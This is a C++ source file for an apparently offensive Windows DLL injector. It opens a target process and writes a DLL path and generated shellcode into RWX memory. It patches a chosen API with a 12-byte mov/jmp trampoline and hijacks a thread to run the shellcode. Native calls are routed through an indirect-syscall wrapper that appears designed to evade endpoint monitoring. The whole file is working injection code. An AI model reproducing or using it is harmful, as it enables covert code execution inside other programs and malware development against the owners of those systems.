#include "thread.h"
#include "injector.h"
#include "shell.h"
#include "config.h"
#include "N2.hpp"

constexpr size_t HOOK_SIZE = 12;

static bool WriteTrampoline(HANDLE hProc, PVOID dest, PVOID src, size_t len, ULONG& oldProt);

bool N2Inject(
    DWORD pid,
    const char* targetDll,
    const char* targetApi,
    const char* dllPathInput)
{
    if (_AbViolationCount()) {
        printf("ActiveBreach violations detected: %u", _AbViolationCount());
        return false;
    }

    string dllPath = N2ResolveDllPath(dllPathInput);
    if (dllPath.empty()) {
        printf("Could not resolve DLL path for '%s'", dllPathInput);
        return false;
    }

    if (GetFileAttributesA(dllPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        printf("DLL file not found: %s", dllPath.c_str());
        return false;
    }

    UniqueModule modTest(LoadLibraryExA(dllPath.c_str(), nullptr, LOAD_LIBRARY_AS_DATAFILE));
    if (!modTest.valid()) {
        printf("DLL failed to load or is corrupt: %s (err %lu)", dllPath.c_str(), GetLastError());
        return false;
    }

    UniqueHandle hProc(OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, pid));
    if (!hProc.valid()) {
        printf("OpenProcess(%u) failed: %lu", pid, GetLastError());
        return false;
    }

    printf("Opened process %u\n", pid);

    auto hookAddrOpt = N2ResolveRemoteProc(pid, targetDll, targetApi);
    if (!hookAddrOpt) {
        printf("ResolveRemoteProc failed for %s!%s\n", targetDll, targetApi);
        return false;
    }

    PVOID hookAddr = reinterpret_cast<PVOID>(*hookAddrOpt);
    printf("Resolved %s!%s at %p\n", targetDll, targetApi, hookAddr);

    array<byte, HOOK_SIZE> orig{};
    ULONG bytesRead = 0;

    NTSTATUS st = ab_call_fn_cpp<NTSTATUS>("NtReadVirtualMemory", hProc.get(), hookAddr, orig.data(), static_cast<ULONG>(orig.size()), &bytesRead);
    if (!NT_SUCCESS(st) || bytesRead != HOOK_SIZE) {
        printf("NtReadVirtualMemory failed: 0x%X read %lu\n", st, bytesRead);
        return false;
    }

    printf("Read %lu bytes\n", bytesRead);

    PVOID remotePath = nullptr;
    SIZE_T pathLen = dllPath.size() + 1;

    st = ab_call_fn_cpp<NTSTATUS>("NtAllocateVirtualMemory", hProc.get(), &remotePath, 0, &pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(st) || !remotePath) {
        printf("NtAllocateVirtualMemory(path) failed: 0x%X\n", st);
        return false;
    }

    st = ab_call_fn_cpp<NTSTATUS>("NtWriteVirtualMemory", hProc.get(), remotePath, const_cast<char*>(dllPath.c_str()), static_cast<ULONG>(pathLen), nullptr);
    if (!NT_SUCCESS(st)) {
        printf("NtWriteVirtualMemory(path) failed: 0x%X\n", st);
        return false;
    }

    printf("Wrote DLL path at %p\n", remotePath);

    PVOID remoteCode = nullptr;
    SIZE_T codeSize = 1024;

    PVOID lowBaseHint = (PVOID)0x10000000;
    SIZE_T lowHintSize = codeSize;
    st = ab_call_fn_cpp<NTSTATUS>("NtAllocateVirtualMemory", hProc.get(), &remoteCode,
        (ULONG_PTR)lowBaseHint, &lowHintSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!NT_SUCCESS(st) || !remoteCode || (uintptr_t)remoteCode >= 0x80000000) {
        remoteCode = nullptr;
        codeSize = 1024;
        st = ab_call_fn_cpp<NTSTATUS>("NtAllocateVirtualMemory", hProc.get(), &remoteCode, 0, &codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (!NT_SUCCESS(st) || !remoteCode) {
        printf("NtAllocateVirtualMemory(code) failed: 0x%X\n", st);
        return false;
    }

    printf("Shellcode allocated at %p (%s low memory)\n", remoteCode,
        (uintptr_t)remoteCode < 0x80000000 ? "OK" : "HIGH");

    vector<byte> shell = N2GenShell(hookAddr, remotePath, remoteCode, orig.data(), orig.size(), true);

    st = ab_call_fn_cpp<NTSTATUS>("NtWriteVirtualMemory", hProc.get(), remoteCode, shell.data(), static_cast<ULONG>(shell.size()), nullptr);
    if (!NT_SUCCESS(st)) {
        printf("NtWriteVirtualMemory(code) failed: 0x%X\n", st);
        return false;
    }

    printf("Shellcode written (%zu bytes)\n", shell.size());

    ULONG oldProt = 0;
    if (!WriteTrampoline(hProc.get(), hookAddr, remoteCode, HOOK_SIZE, oldProt)) {
        printf("WriteTrampoline failed\n");
        return false;
    }

    printf("Trampoline installed\n");

    auto tidOpt = N2TargetThread(hProc.get());
    if (!tidOpt) {
        printf("N2TargetThread failed to find a valid thread\n");
        return false;
    }

    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, *tidOpt);
    if (!hThread) {
        printf("OpenThread failed: %lu\n", GetLastError());
        return false;
    }

    UniqueHandle hThreadHandle(hThread);
    printf("Selected thread %p for hijacking\n", hThread);

    if (!N2ValidateRemoteExecution(hProc.get(), 0x0, reinterpret_cast<uintptr_t>(remoteCode), shell.size())) {
        printf("Shellcode validation FAILED... aborting injection\n");
        return false;
    }
    printf("Shellcode environment validated OK\n\n");

    try {
        N2TeleportThreadExecutionLikeJagger(hProc.get(), hThreadHandle.get(), reinterpret_cast<uintptr_t>(remoteCode));
        printf("Thread hijacked to execute at %p\n", remoteCode);
    }

    catch (const std::exception& e) {
        return false; // Literally just BS
    }

    WaitForSingleObject(hThreadHandle.get(), 10000); // Crashes when closed... Why? Beyond me

    return true;
}

static bool WriteTrampoline(HANDLE hProc, PVOID dest, PVOID src, size_t len, ULONG& oldProt) {
    SIZE_T sz = len;
    PVOID addr = dest;
    NTSTATUS st = ab_call_fn_cpp<NTSTATUS>("NtProtectVirtualMemory", hProc, &addr, &sz, PAGE_EXECUTE_READWRITE, &oldProt);
    if (!NT_SUCCESS(st)) return false;

    array<byte, HOOK_SIZE> hook;
    hook = { 0x48, 0xB8 }; // mov rax, imm64
    std::memcpy(hook.data() + 2, &src, sizeof(src));
    hook[10] = 0xFF; hook[11] = 0xE0; // jmp rax

    st = ab_call_fn_cpp<NTSTATUS>("NtWriteVirtualMemory", hProc, dest, hook.data(), static_cast<ULONG>(len), nullptr);
    if (!NT_SUCCESS(st)) return false;

    st = ab_call_fn_cpp<NTSTATUS>("NtProtectVirtualMemory", hProc, &addr, &sz, oldProt, &oldProt);
    return NT_SUCCESS(st);
}